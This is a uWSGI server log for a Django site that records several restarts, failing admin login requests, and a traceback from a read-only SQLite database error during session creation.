*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 18:39:46 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x5638b4c14250
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5638b4c14250 pid: 24436 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24436)
spawned uWSGI worker 1 (pid: 24439, cores: 2)
spawned uWSGI worker 2 (pid: 24440, cores: 2)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 18:41:06 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x564023606250
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564023606250 pid: 24493 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24493)
spawned uWSGI worker 1 (pid: 24495, cores: 2)
spawned uWSGI worker 2 (pid: 24496, cores: 2)
[pid: 24495|app: 0|req: 1/1] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 18:41:11 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 441 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24495|app: 0|req: 2/2] 113.200.174.49 () {42 vars in 857 bytes} [Fri Apr 22 18:41:16 2022] GET /admin/login/ => generated 2204 bytes in 36 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 1)
[pid: 24495|app: 0|req: 3/3] 113.200.174.49 () {52 vars in 1093 bytes} [Fri Apr 22 18:41:20 2022] POST /admin/login/ => generated 145 bytes in 227 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 18:43:37 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x5586b5f27250
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5586b5f27250 pid: 24539 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24539)
spawned uWSGI worker 1 (pid: 24541, cores: 2)
spawned uWSGI worker 2 (pid: 24542, cores: 2)
[pid: 24541|app: 0|req: 1/1] 113.200.174.49 () {42 vars in 983 bytes} [Fri Apr 22 18:43:50 2022] GET /admin => generated 0 bytes in 205 msecs (HTTP/1.1 301) 6 headers in 216 bytes (1 switches on core 0)
[pid: 24541|app: 0|req: 2/2] 113.200.174.49 () {42 vars in 985 bytes} [Fri Apr 22 18:43:50 2022] GET /admin/ => generated 4321 bytes in 60 msecs (HTTP/1.1 200) 9 headers in 334 bytes (1 switches on core 1)
[pid: 24542|app: 0|req: 1/3] 113.200.174.49 () {42 vars in 934 bytes} [Fri Apr 22 18:43:50 2022] GET /favicon.ico => generated 179 bytes in 265 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 1)
[pid: 24541|app: 0|req: 3/4] 113.200.174.49 () {42 vars in 857 bytes} [Fri Apr 22 18:43:56 2022] GET /admin/login/ => generated 2204 bytes in 16 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24541|app: 0|req: 4/5] 113.200.174.49 () {42 vars in 825 bytes} [Fri Apr 22 18:43:56 2022] GET /favicon.ico => generated 179 bytes in 2 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 1)
[pid: 24542|app: 0|req: 2/6] 113.200.174.49 () {52 vars in 1093 bytes} [Fri Apr 22 18:44:01 2022] POST /admin/login/ => generated 145 bytes in 233 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24542|app: 0|req: 3/7] 113.200.174.49 () {42 vars in 973 bytes} [Fri Apr 22 18:49:35 2022] GET / => generated 5826 bytes in 27 msecs (HTTP/1.1 200) 9 headers in 425 bytes (1 switches on core 1)
[pid: 24542|app: 0|req: 4/8] 113.200.174.49 () {42 vars in 985 bytes} [Fri Apr 22 18:49:39 2022] GET /admin/ => generated 4321 bytes in 31 msecs (HTTP/1.1 200) 9 headers in 334 bytes (1 switches on core 0)
[pid: 24542|app: 0|req: 5/9] 113.200.174.49 () {42 vars in 857 bytes} [Fri Apr 22 18:49:43 2022] GET /admin/login/ => generated 2204 bytes in 14 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 1)
[pid: 24542|app: 0|req: 6/10] 113.200.174.49 () {42 vars in 825 bytes} [Fri Apr 22 18:49:43 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 0)
[pid: 24541|app: 0|req: 5/11] 113.200.174.49 () {52 vars in 1093 bytes} [Fri Apr 22 18:49:49 2022] POST /admin/login/ => generated 145 bytes in 238 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24541|app: 0|req: 6/12] 113.200.174.49 () {44 vars in 1062 bytes} [Fri Apr 22 18:49:54 2022] GET /admin/password_change/ => generated 4774 bytes in 30 msecs (HTTP/1.1 200) 8 headers in 390 bytes (1 switches on core 1)
[pid: 24541|app: 0|req: 7/13] 113.200.174.49 () {48 vars in 1115 bytes} [Fri Apr 22 18:50:29 2022] GET /admin/password_change/ => generated 4774 bytes in 21 msecs (HTTP/1.1 200) 8 headers in 390 bytes (1 switches on core 0)
[pid: 24541|app: 0|req: 8/14] 113.200.174.49 () {46 vars in 1003 bytes} [Fri Apr 22 18:50:31 2022] GET /favicon.ico => generated 179 bytes in 2 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 1)
[pid: 24542|app: 0|req: 7/15] 113.200.174.49 () {48 vars in 1115 bytes} [Fri Apr 22 18:50:31 2022] GET /admin/password_change/ => generated 4774 bytes in 30 msecs (HTTP/1.1 200) 8 headers in 390 bytes (1 switches on core 1)
[pid: 24541|app: 0|req: 9/16] 113.200.174.49 () {46 vars in 1003 bytes} [Fri Apr 22 18:50:33 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 0)
Fri Apr 22 18:53:24 2022 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 18:53:27 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x555b1b46e250
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x555b1b46e250 pid: 24560 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24560)
spawned uWSGI worker 1 (pid: 24562, cores: 2)
spawned uWSGI worker 2 (pid: 24563, cores: 2)
[pid: 24563|app: 0|req: 1/1] 113.200.174.49 () {42 vars in 857 bytes} [Fri Apr 22 18:53:32 2022] GET /admin/login/ => generated 2204 bytes in 311 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24562|app: 0|req: 1/2] 113.200.174.49 () {42 vars in 825 bytes} [Fri Apr 22 18:53:33 2022] GET /favicon.ico => generated 179 bytes in 214 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 0)
[pid: 24563|app: 0|req: 2/3] 113.200.174.49 () {52 vars in 1093 bytes} [Fri Apr 22 18:53:39 2022] POST /admin/login/ => generated 145 bytes in 235 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:04:26 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x55d3f6a65200
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55d3f6a65200 pid: 24657 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24657)
spawned uWSGI worker 1 (pid: 24659, cores: 2)
spawned uWSGI worker 2 (pid: 24661, cores: 2)
[pid: 24659|app: 0|req: 1/1] 113.200.174.49 () {42 vars in 769 bytes} [Fri Apr 22 19:04:37 2022] GET /admin/ => generated 0 bytes in 337 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 0)
[pid: 24661|app: 0|req: 1/2] 113.200.174.49 () {42 vars in 806 bytes} [Fri Apr 22 19:04:37 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 311 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24661|app: 0|req: 2/3] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 19:04:42 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 215 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24659|app: 0|req: 2/4] 113.200.174.49 () {42 vars in 833 bytes} [Fri Apr 22 19:05:00 2022] GET / => generated 5599 bytes in 30 msecs (HTTP/1.1 200) 9 headers in 425 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:05:38 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 0.0.0.0:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x558818e3b0a0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x558818e3b0a0 pid: 24670 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24670)
spawned uWSGI worker 1 (pid: 24672, cores: 2)
spawned uWSGI worker 2 (pid: 24673, cores: 2)
[pid: 24672|app: 0|req: 1/1] 113.200.174.49 () {44 vars in 894 bytes} [Fri Apr 22 19:05:42 2022] GET /admin => generated 0 bytes in 237 msecs (HTTP/1.1 301) 6 headers in 216 bytes (1 switches on core 0)
[pid: 24672|app: 0|req: 2/2] 113.200.174.49 () {44 vars in 896 bytes} [Fri Apr 22 19:05:42 2022] GET /admin/ => generated 0 bytes in 18 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 1)
[pid: 24672|app: 0|req: 3/3] 113.200.174.49 () {44 vars in 933 bytes} [Fri Apr 22 19:05:42 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 35 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24672|app: 0|req: 4/4] 113.200.174.49 () {52 vars in 1227 bytes} [Fri Apr 22 19:05:49 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 237 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24673|app: 0|req: 1/5] 113.200.174.49 () {44 vars in 966 bytes} [Fri Apr 22 19:05:59 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 268 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24673|app: 0|req: 2/6] 113.200.174.49 () {52 vars in 1227 bytes} [Fri Apr 22 19:06:04 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 231 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:09:53 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x55f98198a200
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55f98198a200 pid: 24697 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24697)
spawned uWSGI worker 1 (pid: 24699, cores: 2)
spawned uWSGI worker 2 (pid: 24700, cores: 2)
[pid: 24699|app: 0|req: 1/1] 113.200.174.49 () {42 vars in 850 bytes} [Fri Apr 22 19:10:14 2022] GET /admin => generated 0 bytes in 225 msecs (HTTP/1.1 301) 6 headers in 216 bytes (1 switches on core 0)
[pid: 24700|app: 0|req: 1/2] 113.200.174.49 () {42 vars in 852 bytes} [Fri Apr 22 19:10:15 2022] GET /admin/ => generated 0 bytes in 245 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 0)
[pid: 24699|app: 0|req: 2/3] 113.200.174.49 () {42 vars in 889 bytes} [Fri Apr 22 19:10:15 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 54 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 1)
[pid: 24700|app: 0|req: 2/4] 113.200.174.49 () {42 vars in 820 bytes} [Fri Apr 22 19:10:15 2022] GET /favicon.ico => generated 179 bytes in 13 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 1)
[pid: 24699|app: 0|req: 3/5] 113.200.174.49 () {52 vars in 1138 bytes} [Fri Apr 22 19:10:20 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 232 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:11:48 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x55f2ce387200
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55f2ce387200 pid: 24714 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24714)
spawned uWSGI worker 1 (pid: 24716, cores: 2)
spawned uWSGI worker 2 (pid: 24717, cores: 2)
[pid: 24716|app: 0|req: 1/1] 113.200.174.49 () {44 vars in 864 bytes} [Fri Apr 22 19:11:51 2022] GET / => generated 5599 bytes in 289 msecs (HTTP/1.1 200) 9 headers in 425 bytes (1 switches on core 0)
[pid: 24717|app: 0|req: 1/2] 113.200.174.49 () {42 vars in 843 bytes} [Fri Apr 22 19:11:55 2022] GET /admin => generated 0 bytes in 241 msecs (HTTP/1.1 301) 6 headers in 216 bytes (1 switches on core 0)
[pid: 24716|app: 0|req: 2/3] 113.200.174.49 () {42 vars in 845 bytes} [Fri Apr 22 19:11:56 2022] GET /admin/ => generated 0 bytes in 8 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 1)
[pid: 24716|app: 0|req: 3/4] 113.200.174.49 () {42 vars in 882 bytes} [Fri Apr 22 19:11:56 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 16 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24716|app: 0|req: 4/5] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 19:12:00 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 236 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24716|app: 0|req: 5/6] 113.200.174.49 () {42 vars in 769 bytes} [Fri Apr 22 19:12:11 2022] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 0)
[pid: 24716|app: 0|req: 6/7] 113.200.174.49 () {42 vars in 806 bytes} [Fri Apr 22 19:12:11 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 6 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 1)
[pid: 24717|app: 0|req: 2/8] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 19:12:16 2022] POST /admin/login/?next=/admin/ => generated 145 bytes in 278 msecs (HTTP/1.1 500) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24716|app: 0|req: 7/9] 113.200.174.49 () {52 vars in 1055 bytes} [Fri Apr 22 19:12:43 2022] POST /admin/login/?next=/admin/ => generated 1315 bytes in 3 msecs (HTTP/1.1 403) 6 headers in 200 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:12:49 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
setgid() to 1000
setuid() to 1000
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x555b08c52200
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 250128 bytes (244 KB) for 4 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x555b08c52200 pid: 24723 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24723)
spawned uWSGI worker 1 (pid: 24725, cores: 2)
spawned uWSGI worker 2 (pid: 24726, cores: 2)
Forbidden (CSRF cookie not set.): /admin/login/
[pid: 24726|app: 0|req: 1/1] 113.200.174.49 () {52 vars in 1055 bytes} [Fri Apr 22 19:12:51 2022] POST /admin/login/?next=/admin/ => generated 2801 bytes in 263 msecs (HTTP/1.1 403) 6 headers in 200 bytes (1 switches on core 0)
[pid: 24725|app: 0|req: 1/2] 113.200.174.49 () {42 vars in 781 bytes} [Fri Apr 22 19:12:54 2022] GET /admin/login/ => generated 2204 bytes in 298 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
Internal Server Error: /admin/login/
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 89, in _execute
    return self.cursor.execute(sql, params)
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/sqlite3/base.py", line 477, in execute
    return Database.Cursor.execute(self, query, params)
sqlite3.OperationalError: attempt to write a readonly database

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.8/dist-packages/django/core/handlers/base.py", line 197, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/utils/decorators.py", line 46, in _wrapper
    return bound_method(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/views/decorators/cache.py", line 62, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/admin/sites.py", line 440, in login
    return LoginView.as_view(**defaults)(request)
  File "/usr/local/lib/python3.8/dist-packages/django/views/generic/base.py", line 84, in view
    return self.dispatch(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/utils/decorators.py", line 46, in _wrapper
    return bound_method(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/views/decorators/debug.py", line 92, in sensitive_post_parameters_wrapper
    return view(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/utils/decorators.py", line 46, in _wrapper
    return bound_method(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/utils/decorators.py", line 133, in _wrapped_view
    response = view_func(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/utils/decorators.py", line 46, in _wrapper
    return bound_method(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/views/decorators/cache.py", line 62, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/auth/views.py", line 67, in dispatch
    return super().dispatch(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/views/generic/base.py", line 119, in dispatch
    return handler(request, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/views/generic/edit.py", line 153, in post
    return self.form_valid(form)
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/auth/views.py", line 98, in form_valid
    auth_login(self.request, form.get_user())
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/auth/__init__.py", line 118, in login
    request.session.cycle_key()
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/sessions/backends/base.py", line 298, in cycle_key
    self.create()
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/sessions/backends/db.py", line 54, in create
    self.save(must_create=True)
  File "/usr/local/lib/python3.8/dist-packages/django/contrib/sessions/backends/db.py", line 86, in save
    obj.save(
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/base.py", line 806, in save
    self.save_base(
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/base.py", line 857, in save_base
    updated = self._save_table(
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/base.py", line 1000, in _save_table
    results = self._do_insert(
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/base.py", line 1041, in _do_insert
    return manager._insert(
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/manager.py", line 85, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/query.py", line 1434, in _insert
    return query.get_compiler(using=using).execute_sql(returning_fields)
  File "/usr/local/lib/python3.8/dist-packages/django/db/models/sql/compiler.py", line 1621, in execute_sql
    cursor.execute(sql, params)
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 103, in execute
    return super().execute(sql, params)
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 67, in execute
    return self._execute_with_wrappers(
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 80, in _execute_with_wrappers
    return executor(sql, params, many, context)
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 89, in _execute
    return self.cursor.execute(sql, params)
  File "/usr/local/lib/python3.8/dist-packages/django/db/utils.py", line 91, in __exit__
    raise dj_exc_value.with_traceback(traceback) from exc_value
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/utils.py", line 89, in _execute
    return self.cursor.execute(sql, params)
  File "/usr/local/lib/python3.8/dist-packages/django/db/backends/sqlite3/base.py", line 477, in execute
    return Database.Cursor.execute(self, query, params)
django.db.utils.OperationalError: attempt to write a readonly database
[pid: 24726|app: 0|req: 2/3] 113.200.174.49 () {52 vars in 1093 bytes} [Fri Apr 22 19:12:59 2022] POST /admin/login/ => generated 212210 bytes in 268 msecs (HTTP/1.1 500) 7 headers in 228 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:26:37 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
